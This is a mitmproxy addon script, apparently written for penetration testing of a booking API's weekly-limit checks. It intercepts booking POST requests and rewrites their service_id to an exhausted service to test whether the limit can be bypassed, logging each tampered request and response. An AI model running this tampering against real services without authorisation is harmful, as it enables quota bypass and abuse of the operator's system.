"""
Tests whether the weekly-limit check and the actual booking write are
scoped to the SAME service consistently, by making the service_id seen
by /bookings/services/check-access and /bookings/services/weekly-limit
disagree with the service_id in the final POST /bookings/services body.

Concretely: book a slot that in the app corresponds to an UNDER-LIMIT
service, but rewrite the POST body's service_id (and only that field)
to point at EXHAUSTED_SERVICE_ID (Gym) instead, leaving location_id/
start_time/end_time untouched.

Two outcomes worth logging:
  - 400/limit-exceeded -> the booking write correctly re-checks the
    limit for whatever service_id ends up in the body (good).
  - 2xx accepted -> you just consumed/bypassed Gym's exhausted limit
    using a different service's real availability, or created a
    booking with mismatched service_id/location_id — a real finding
    either way; check what the weekly-limit GET for both services
    shows afterwards.

Run with:
    mitmdump -s service_scope_confusion_tamper_test.py
"""

import json
from mitmproxy import http, ctx

PATH = "/bookings/services"
EXHAUSTED_SERVICE_ID = "cmkztqx2d000fuckto9dknnv3"  # Gym
# Only rewrite POSTs whose ORIGINAL service_id is NOT the exhausted one,
# i.e. a real booking attempt against a service you're still under-limit on.
SKIP_IF_ALREADY = EXHAUSTED_SERVICE_ID


def matches(flow: http.HTTPFlow) -> bool:
	req = flow.request
	if req.method != "POST":
		return False
	if not req.path.split("?")[0].endswith(PATH):
		return False
	try:
		body = json.loads(req.get_text() or "{}")
	except ValueError:
		return False
	return (
		body.get("service_id")
		and body.get("service_id") != SKIP_IF_ALREADY
	)


def request(flow: http.HTTPFlow) -> None:
	if not matches(flow):
		return
	try:
		body = json.loads(flow.request.get_text())
	except ValueError:
		return
	original = body["service_id"]
	body["service_id"] = EXHAUSTED_SERVICE_ID
	flow.request.set_text(json.dumps(body))
	flow.comment = (
		f"tampered: service_id {original} -> {EXHAUSTED_SERVICE_ID}"
	)
	ctx.log.info(
		f"[scope-confusion] real service_id={original}, location/time left as-is, "
		f"rewrote service_id -> {EXHAUSTED_SERVICE_ID}"
	)


def response(flow: http.HTTPFlow) -> None:
	if not matches(flow) or flow.response is None:
		return
	ctx.log.info(
		f"[scope-confusion] response status={flow.response.status_code} "
		f"body={flow.response.get_text()}"
	)
